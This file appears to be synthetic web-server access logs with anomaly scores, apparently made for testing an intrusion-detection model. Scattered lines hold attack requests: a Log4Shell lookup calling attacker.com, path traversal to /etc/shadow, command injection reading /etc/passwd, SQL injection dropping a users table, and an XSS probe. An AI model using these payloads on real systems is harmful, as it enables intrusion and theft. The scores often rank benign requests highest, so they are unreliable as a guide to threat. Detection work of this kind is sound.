score_content,score_session,score_fused,score_fused_norm,line
2.0467758178710938,,2.0467758178710938,2.0467758178710938,234.121.194.138 - - [10/Jan/2025:12:04:56 +0000] "GET /profile HTTP/1.1" 200 18097 "https://www.google.com/" "sqlmap/1.5.10#stable"
2.1191558837890625,,2.1191558837890625,2.1191558837890625,181.93.20.235 - - [10/Jan/2025:12:04:57 +0000] "GET /about HTTP/1.1" 200 17407 "-" "python-requests/2.31.0"
1.9605209827423096,,1.9605209827423096,1.9605209827423096,43.84.219.134 - - [10/Jan/2025:12:04:57 +0000] "GET /api/products HTTP/1.1" 200 5010 "-" "Wget/1.20.3 (linux-gnu)"
24.294391632080078,,24.294391632080078,24.294391632080078,115.208.15.117 - - [10/Jan/2025:12:05:02 +0000] "GET /search?q=headphones HTTP/1.1" 200 16823 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.32452407479286194,,0.32452407479286194,0.32452407479286194,186.6.102.66 - - [10/Jan/2025:12:05:05 +0000] "GET /index.html HTTP/1.1" 200 10198 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8204383850097656,,1.8204383850097656,1.8204383850097656,139.16.240.229 - - [10/Jan/2025:12:05:09 +0000] "GET /server-status HTTP/1.1" 200 2189 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.1674821376800537,,3.1674821376800537,3.1674821376800537,96.229.98.115 - - [10/Jan/2025:12:05:09 +0000] "GET /assets/app.js HTTP/1.1" 304 13874 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.21377043426036835,,0.21377043426036835,0.21377043426036835,31.46.138.101 - - [10/Jan/2025:12:05:09 +0000] "GET /assets/app.css HTTP/1.1" 204 11495 "https://www.google.com/" "python-requests/2.31.0"
5.18782377243042,,5.18782377243042,5.18782377243042,119.173.185.140 - - [10/Jan/2025:12:05:14 +0000] "GET / HTTP/1.1" 302 9876 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.38385772705078,,24.38385772705078,24.38385772705078,71.49.240.225 - - [10/Jan/2025:12:05:17 +0000] "GET /api/product?id=123 HTTP/1.1" 200 5183 "-" "sqlmap/1.5.10#stable"
24.371580123901367,,24.371580123901367,24.371580123901367,62.53.18.26 - - [10/Jan/2025:12:05:17 +0000] "GET /search?q=phone HTTP/1.1" 201 612 "-" "python-requests/2.31.0"
0.3050808906555176,,0.3050808906555176,0.3050808906555176,103.113.60.139 - - [10/Jan/2025:12:05:20 +0000] "GET /index.html HTTP/1.1" 200 1549 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.085186719894409,,2.085186719894409,2.085186719894409,82.148.154.198 - - [10/Jan/2025:12:05:21 +0000] "GET /logout HTTP/1.1" 200 18977 "https://example.com/" "sqlmap/1.5.10#stable"
11029.80078125,,11029.80078125,11029.80078125,57.106.77.71 - - [10/Jan/2025:12:05:22 +0000] "GET /assets/app.css HTTP/1.1" 502 1067 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.25068414211273193,,0.25068414211273193,0.25068414211273193,143.127.13.249 - - [10/Jan/2025:12:05:26 +0000] "GET /assets/app.js HTTP/1.1" 201 14098 "https://news.ycombinator.com/" "curl/7.68.0"
24.371503829956055,,24.371503829956055,24.371503829956055,97.48.194.138 - - [10/Jan/2025:12:05:30 +0000] "GET /search?q=phone HTTP/1.1" 200 9926 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
3.1104278564453125,,3.1104278564453125,3.1104278564453125,144.106.248.107 - - [10/Jan/2025:12:05:31 +0000] "GET /assets/app.css HTTP/1.1" 304 1988 "https://twitter.com/" "python-requests/2.31.0"
2.076348304748535,,2.076348304748535,2.076348304748535,237.116.217.95 - - [10/Jan/2025:12:05:32 +0000] "GET /login HTTP/1.1" 200 2690 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.35128253698349,,0.35128253698349,0.35128253698349,155.11.224.19 - - [10/Jan/2025:12:05:37 +0000] "GET /index.html HTTP/1.1" 200 19923 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9800671339035034,,1.9800671339035034,1.9800671339035034,78.245.233.4 - - [10/Jan/2025:12:05:42 +0000] "GET /api/products HTTP/1.1" 200 11010 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30164.216796875,,30164.216796875,30164.216796875,155.181.53.102 - - [10/Jan/2025:12:05:47 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 404 1424 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.354761123657227,,24.354761123657227,24.354761123657227,79.67.93.132 - - [10/Jan/2025:12:05:49 +0000] "GET /search?q=laptop HTTP/1.1" 200 11872 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
27.15205192565918,,27.15205192565918,27.15205192565918,235.53.95.81 - - [10/Jan/2025:12:05:49 +0000] "GET /search?q=headphones HTTP/1.1" 302 10593 "-" "Wget/1.20.3 (linux-gnu)"
0.23925457894802094,,0.23925457894802094,0.23925457894802094,240.150.149.185 - - [10/Jan/2025:12:05:53 +0000] "GET /assets/app.css HTTP/1.1" 200 18230 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
24.393701553344727,,24.393701553344727,24.393701553344727,128.141.168.242 - - [10/Jan/2025:12:05:54 +0000] "GET /api/product?id=123 HTTP/1.1" 200 8152 "https://example.com/" "sqlmap/1.5.10#stable"
11053.62109375,,11053.62109375,11053.62109375,190.126.118.44 - - [10/Jan/2025:12:05:56 +0000] "GET /search?q=headphones HTTP/1.1" 500 1314 "https://example.com/" "sqlmap/1.5.10#stable"
24.598461151123047,,24.598461151123047,24.598461151123047,254.165.246.16 - - [10/Jan/2025:12:05:57 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 17864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0904462337493896,,2.0904462337493896,2.0904462337493896,18.182.39.3 - - [10/Jan/2025:12:06:02 +0000] "GET /admin HTTP/1.1" 200 7683 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.269575119018555,,24.269575119018555,24.269575119018555,2.137.142.106 - - [10/Jan/2025:12:06:05 +0000] "GET /search?q=headphones HTTP/1.1" 204 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.072674512863159,,2.072674512863159,2.072674512863159,207.241.233.46 - - [10/Jan/2025:12:06:09 +0000] "GET /logout HTTP/1.1" 200 14209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.199731826782227,,24.199731826782227,24.199731826782227,209.91.69.204 - - [10/Jan/2025:12:06:13 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 201 8371 "-" "dirb/2.22"
24.340808868408203,,24.340808868408203,24.340808868408203,77.176.212.218 - - [10/Jan/2025:12:06:15 +0000] "GET /search?q=camera HTTP/1.1" 200 7500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.328155517578125,,24.328155517578125,24.328155517578125,164.3.180.44 - - [10/Jan/2025:12:06:15 +0000] "GET /search?q=laptop HTTP/1.1" 200 1938 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9354243278503418,,1.9354243278503418,1.9354243278503418,230.136.236.11 - - [10/Jan/2025:12:06:18 +0000] "GET /dashboard HTTP/1.1" 200 3224 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.2530574798584,,24.2530574798584,24.2530574798584,176.237.72.231 - - [10/Jan/2025:12:06:23 +0000] "GET /search?q=headphones HTTP/1.1" 200 2536 "https://twitter.com/" "python-requests/2.31.0"
24.38850212097168,,24.38850212097168,24.38850212097168,151.37.193.211 - - [10/Jan/2025:12:06:28 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 6888 "-" "dirb/2.22"
24.408388137817383,,24.408388137817383,24.408388137817383,174.230.139.85 - - [10/Jan/2025:12:06:30 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12851 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
2.037046194076538,,2.037046194076538,2.037046194076538,60.215.20.88 - - [10/Jan/2025:12:06:35 +0000] "GET /profile HTTP/1.1" 200 14422 "https://twitter.com/" "python-requests/2.31.0"
1.953438639640808,,1.953438639640808,1.953438639640808,201.116.126.59 - - [10/Jan/2025:12:06:39 +0000] "GET /dashboard HTTP/1.1" 200 9056 "https://twitter.com/" "curl/7.68.0"
24.348268508911133,,24.348268508911133,24.348268508911133,205.64.183.19 - - [10/Jan/2025:12:06:42 +0000] "GET /search?q=laptop HTTP/1.1" 200 9778 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.092958688735962,,3.092958688735962,3.092958688735962,93.28.24.2 - - [10/Jan/2025:12:06:43 +0000] "GET /assets/app.css HTTP/1.1" 302 10476 "https://news.ycombinator.com/" "curl/7.68.0"
2.011489152908325,,2.011489152908325,2.011489152908325,111.115.143.143 - - [10/Jan/2025:12:06:45 +0000] "GET /contact HTTP/1.1" 200 6240 "https://news.ycombinator.com/" "python-requests/2.31.0"
24.349260330200195,,24.349260330200195,24.349260330200195,154.201.84.222 - - [10/Jan/2025:12:06:45 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 19660 "-" "dirb/2.22"
4.997191905975342,,4.997191905975342,4.997191905975342,232.251.63.147 - - [10/Jan/2025:12:06:47 +0000] "GET /about HTTP/1.1" 302 18434 "https://www.google.com/" "python-requests/2.31.0"
0.2124605029821396,,0.2124605029821396,0.2124605029821396,127.38.17.43 - - [10/Jan/2025:12:06:52 +0000] "GET /assets/app.css HTTP/1.1" 200 8895 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
2.092097282409668,,2.092097282409668,2.092097282409668,185.161.127.153 - - [10/Jan/2025:12:06:55 +0000] "GET /about HTTP/1.1" 200 8180 "https://www.google.com/" "python-requests/2.31.0"
24.409013748168945,,24.409013748168945,24.409013748168945,86.216.159.98 - - [10/Jan/2025:12:06:58 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 13066 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.2432650923728943,,0.2432650923728943,0.2432650923728943,243.178.52.123 - - [10/Jan/2025:12:07:00 +0000] "GET /assets/app.css HTTP/1.1" 200 19866 "https://www.google.com/" "curl/7.68.0"
4.953516483306885,,4.953516483306885,4.953516483306885,248.148.201.63 - - [10/Jan/2025:12:07:03 +0000] "GET /logout HTTP/1.1" 302 16189 "https://news.ycombinator.com/" "curl/7.68.0"
24.373077392578125,,24.373077392578125,24.373077392578125,52.152.140.47 - - [10/Jan/2025:12:07:05 +0000] "GET /search?q=laptop HTTP/1.1" 200 18576 "https://twitter.com/" "sqlmap/1.5.10#stable"
30165.125,,30165.125,30165.125,113.205.75.213 - - [10/Jan/2025:12:07:05 +0000] "GET /search?q=camera HTTP/1.1" 429 429 "-" "sqlmap/1.5.10#stable"
0.2075686901807785,,0.2075686901807785,0.2075686901807785,65.169.40.184 - - [10/Jan/2025:12:07:08 +0000] "GET /assets/app.css HTTP/1.1" 201 8030 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
24.296417236328125,,24.296417236328125,24.296417236328125,130.237.236.223 - - [10/Jan/2025:12:07:08 +0000] "GET /search?q=headphones HTTP/1.1" 200 17610 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
27.200178146362305,,27.200178146362305,27.200178146362305,153.164.235.22 - - [10/Jan/2025:12:07:12 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 301 17693 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.21473927795886993,,0.21473927795886993,0.21473927795886993,145.252.166.174 - - [10/Jan/2025:12:07:17 +0000] "GET /assets/app.js HTTP/1.1" 204 1551 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
24.35088348388672,,24.35088348388672,24.35088348388672,67.57.131.192 - - [10/Jan/2025:12:07:19 +0000] "GET /search?q=phone HTTP/1.1" 200 3331 "https://twitter.com/" "python-requests/2.31.0"
24.40857696533203,,24.40857696533203,24.40857696533203,119.198.174.151 - - [10/Jan/2025:12:07:23 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12916 "https://twitter.com/" "sqlmap/1.5.10#stable"
2.3120763301849365,,2.3120763301849365,2.3120763301849365,107.236.247.22 - - [10/Jan/2025:12:07:24 +0000] "GET / HTTP/1.1" 200 9780 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.2849178314209,,27.2849178314209,27.2849178314209,124.90.122.25 - - [10/Jan/2025:12:07:26 +0000] "GET /search?q=camera HTTP/1.1" 304 17175 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
3.1623175144195557,,3.1623175144195557,3.1623175144195557,6.218.88.166 - - [10/Jan/2025:12:07:28 +0000] "GET /wp-login.php HTTP/1.1" 304 3871 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.24342279136180878,,0.24342279136180878,0.24342279136180878,144.110.246.119 - - [10/Jan/2025:12:07:33 +0000] "GET /assets/app.js HTTP/1.1" 200 10945 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.360443115234375,,24.360443115234375,24.360443115234375,116.152.110.100 - - [10/Jan/2025:12:07:38 +0000] "GET /search?q=phone HTTP/1.1" 200 6565 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.1198832988739014,,2.1198832988739014,2.1198832988739014,48.94.84.51 - - [10/Jan/2025:12:07:39 +0000] "GET /about HTTP/1.1" 200 17692 "-" "Wget/1.20.3 (linux-gnu)"
24.275911331176758,,24.275911331176758,24.275911331176758,153.100.157.101 - - [10/Jan/2025:12:07:41 +0000] "GET /search?q=headphones HTTP/1.1" 200 10369 "-" "python-requests/2.31.0"
24.3464412689209,,24.3464412689209,24.3464412689209,236.158.152.22 - - [10/Jan/2025:12:07:43 +0000] "GET /search?q=camera HTTP/1.1" 201 9846 "https://www.google.com/" "sqlmap/1.5.10#stable"
24.4068603515625,,24.4068603515625,24.4068603515625,178.37.131.100 - - [10/Jan/2025:12:07:45 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 12332 "https://twitter.com/" "dirb/2.22"
24.393659591674805,,24.393659591674805,24.393659591674805,178.236.166.239 - - [10/Jan/2025:12:07:46 +0000] "GET /search?q=phone HTTP/1.1" 200 17708 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.230454683303833,,0.230454683303833,0.230454683303833,159.14.222.92 - - [10/Jan/2025:12:07:47 +0000] "GET /assets/app.css HTTP/1.1" 200 14878 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11053.7041015625,,11053.7041015625,11053.7041015625,168.127.105.176 - - [10/Jan/2025:12:07:48 +0000] "GET /search?q=laptop HTTP/1.1" 500 1035 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
24.298969268798828,,24.298969268798828,24.298969268798828,8.204.195.57 - - [10/Jan/2025:12:07:53 +0000] "GET /search?q=headphones HTTP/1.1" 200 18626 "-" "curl/7.68.0"
2.0751020908355713,,2.0751020908355713,2.0751020908355713,145.191.198.197 - - [10/Jan/2025:12:07:55 +0000] "GET /logout HTTP/1.1" 200 15085 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.3168008029460907,,0.3168008029460907,0.3168008029460907,211.254.94.139 - - [10/Jan/2025:12:07:59 +0000] "GET /.git/config HTTP/1.1" 200 17896 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.365936279296875,,24.365936279296875,24.365936279296875,77.224.9.116 - - [10/Jan/2025:12:08:03 +0000] "GET /search?q=phone HTTP/1.1" 200 8211 "https://example.com/" "curl/7.68.0"
4.932303428649902,,4.932303428649902,4.932303428649902,54.208.189.151 - - [10/Jan/2025:12:08:03 +0000] "GET /contact HTTP/1.1" 304 7864 "https://example.com/" "sqlmap/1.5.10#stable"
24.354284286499023,,24.354284286499023,24.354284286499023,201.53.209.53 - - [10/Jan/2025:12:08:08 +0000] "GET /search?q=phone HTTP/1.1" 200 4662 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.23947221040725708,,0.23947221040725708,0.23947221040725708,75.147.69.244 - - [10/Jan/2025:12:08:10 +0000] "GET /assets/app.js HTTP/1.1" 200 9689 "-" "python-requests/2.31.0"
30164.03125,,30164.03125,30164.03125,222.168.33.180 - - [10/Jan/2025:12:08:11 +0000] "GET /search?q=phone HTTP/1.1" 404 567 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.28417205810547,,27.28417205810547,27.28417205810547,126.37.148.162 - - [10/Jan/2025:12:08:12 +0000] "GET /api/product?id=123 HTTP/1.1" 302 12968 "https://news.ycombinator.com/" "curl/7.68.0"
2.095489740371704,,2.095489740371704,2.095489740371704,178.240.225.95 - - [10/Jan/2025:12:08:15 +0000] "GET /about HTTP/1.1" 200 9216 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
4.988551616668701,,4.988551616668701,4.988551616668701,163.171.179.92 - - [10/Jan/2025:12:08:17 +0000] "GET /about HTTP/1.1" 302 15122 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30163.849609375,,30163.849609375,30163.849609375,69.83.213.73 - - [10/Jan/2025:12:08:20 +0000] "GET /search?q=phone HTTP/1.1" 400 1013 "https://twitter.com/" "curl/7.68.0"
27.471818923950195,,27.471818923950195,27.471818923950195,12.26.161.201 - - [10/Jan/2025:12:08:24 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 304 1686 "-" "nikto/2.5.0"
0.3254243731498718,,0.3254243731498718,0.3254243731498718,254.246.110.52 - - [10/Jan/2025:12:08:24 +0000] "GET /assets/app.js HTTP/1.1" 200 122 "https://www.google.com/" "sqlmap/1.5.10#stable"
2.1039037704467773,,2.1039037704467773,2.1039037704467773,65.22.96.171 - - [10/Jan/2025:12:08:29 +0000] "GET /login HTTP/1.1" 200 11910 "https://www.google.com/" "sqlmap/1.5.10#stable"
4.928277492523193,,4.928277492523193,4.928277492523193,110.168.24.181 - - [10/Jan/2025:12:08:29 +0000] "GET /logout HTTP/1.1" 302 7772 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.23643404245376587,,0.23643404245376587,0.23643404245376587,175.114.3.3 - - [10/Jan/2025:12:08:30 +0000] "GET /assets/app.css HTTP/1.1" 200 17121 "https://example.com/" "sqlmap/1.5.10#stable"
27.244348526000977,,27.244348526000977,27.244348526000977,19.59.99.23 - - [10/Jan/2025:12:08:30 +0000] "GET /search?q=phone HTTP/1.1" 301 15753 "-" "sqlmap/1.5.10#stable"
2.042048692703247,,2.042048692703247,2.042048692703247,165.174.37.18 - - [10/Jan/2025:12:08:30 +0000] "GET /logout HTTP/1.1" 200 4462 "https://twitter.com/" "python-requests/2.31.0"
0.23089385032653809,,0.23089385032653809,0.23089385032653809,161.192.39.236 - - [10/Jan/2025:12:08:30 +0000] "GET /assets/app.js HTTP/1.1" 200 7081 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.9561675786972046,,1.9561675786972046,1.9561675786972046,36.193.32.151 - - [10/Jan/2025:12:08:35 +0000] "GET /api/products HTTP/1.1" 200 3392 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
4.866079330444336,,4.866079330444336,4.866079330444336,71.166.22.64 - - [10/Jan/2025:12:08:37 +0000] "GET /dashboard HTTP/1.1" 304 8219 "https://twitter.com/" "python-requests/2.31.0"
4.964421272277832,,4.964421272277832,4.964421272277832,218.217.169.225 - - [10/Jan/2025:12:08:41 +0000] "GET /logout HTTP/1.1" 304 978 "https://www.google.com/" "curl/7.68.0"
4.85166072845459,,4.85166072845459,4.85166072845459,166.14.201.230 - - [10/Jan/2025:12:08:45 +0000] "GET /api/products HTTP/1.1" 302 9784 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.55243682861328,,24.55243682861328,24.55243682861328,136.228.251.4 - - [10/Jan/2025:12:08:48 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 201 2426 "https://example.com/" "sqlmap/1.5.10#stable"
24.357770919799805,,24.357770919799805,24.357770919799805,196.121.245.253 - - [10/Jan/2025:12:08:49 +0000] "GET /search?q=phone HTTP/1.1" 200 5761 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.520484924316406,,24.520484924316406,24.520484924316406,243.203.102.130 - - [10/Jan/2025:12:08:53 +0000] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 2081 "https://twitter.com/" "python-requests/2.31.0"
24.370830535888672,,24.370830535888672,24.370830535888672,138.158.40.72 - - [10/Jan/2025:12:08:56 +0000] "GET /search?q=laptop HTTP/1.1" 200 17682 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11031.4150390625,,11031.4150390625,11031.4150390625,138.84.101.151 - - [10/Jan/2025:12:08:56 +0000] "GET /api/products HTTP/1.1" 500 318 "-" "sqlmap/1.5.10#stable"
24.378232955932617,,24.378232955932617,24.378232955932617,237.112.30.117 - - [10/Jan/2025:12:08:58 +0000] "GET /api/product?id=123 HTTP/1.1" 200 2925 "https://twitter.com/" "python-requests/2.31.0"
0.22281049191951752,,0.22281049191951752,0.22281049191951752,180.3.42.128 - - [10/Jan/2025:12:08:58 +0000] "GET /assets/app.js HTTP/1.1" 200 4596 "https://twitter.com/" "curl/7.68.0"
2.0793755054473877,,2.0793755054473877,2.0793755054473877,192.200.224.69 - - [10/Jan/2025:12:09:02 +0000] "GET /login HTTP/1.1" 200 4259 "-" "sqlmap/1.5.10#stable"
24.350313186645508,,24.350313186645508,24.350313186645508,68.183.250.148 - - [10/Jan/2025:12:09:02 +0000] "GET /search?q=phone HTTP/1.1" 200 2192 "-" "sqlmap/1.5.10#stable"
2.048217535018921,,2.048217535018921,2.048217535018921,43.95.41.66 - - [10/Jan/2025:12:09:05 +0000] "GET /profile HTTP/1.1" 200 18675 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.33331298828125,,27.33331298828125,27.33331298828125,12.220.221.4 - - [10/Jan/2025:12:09:10 +0000] "GET /api/product?id=123 HTTP/1.1" 302 184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.20010310411453247,,0.20010310411453247,0.20010310411453247,142.206.234.183 - - [10/Jan/2025:12:09:13 +0000] "GET /assets/app.css HTTP/1.1" 200 1258 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
30164.025390625,,30164.025390625,30164.025390625,70.212.20.147 - - [10/Jan/2025:12:09:14 +0000] "GET /search?q=phone HTTP/1.1" 404 655 "-" "curl/7.68.0"
0.3440018892288208,,0.3440018892288208,0.3440018892288208,252.12.245.103 - - [10/Jan/2025:12:09:18 +0000] "GET /index.html HTTP/1.1" 200 17000 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0833163261413574,,2.0833163261413574,2.0833163261413574,117.3.95.52 - - [10/Jan/2025:12:09:20 +0000] "GET /logout HTTP/1.1" 200 18223 "https://twitter.com/" "curl/7.68.0"
24.426036834716797,,24.426036834716797,24.426036834716797,249.127.198.199 - - [10/Jan/2025:12:09:22 +0000] "GET /api/product?id=123 HTTP/1.1" 200 19488 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.394006729125977,,24.394006729125977,24.394006729125977,89.163.215.178 - - [10/Jan/2025:12:09:23 +0000] "GET /search?q=phone HTTP/1.1" 200 17845 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30163.861328125,,30163.861328125,30163.861328125,79.27.53.136 - - [10/Jan/2025:12:09:23 +0000] "GET /search?q=laptop HTTP/1.1" 401 1489 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.0702879428863525,,3.0702879428863525,3.0702879428863525,12.236.60.230 - - [10/Jan/2025:12:09:26 +0000] "GET /assets/app.css HTTP/1.1" 302 3148 "https://news.ycombinator.com/" "python-requests/2.31.0"
11053.771484375,,11053.771484375,11053.771484375,149.25.130.35 - - [10/Jan/2025:12:09:31 +0000] "GET /search?q=camera HTTP/1.1" 500 173 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.30562159419059753,,0.30562159419059753,0.30562159419059753,61.75.67.218 - - [10/Jan/2025:12:09:31 +0000] "GET /index.html HTTP/1.1" 200 4383 "https://news.ycombinator.com/" "curl/7.68.0"
1.9532924890518188,,1.9532924890518188,1.9532924890518188,60.20.242.52 - - [10/Jan/2025:12:09:36 +0000] "GET /dashboard HTTP/1.1" 200 9011 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
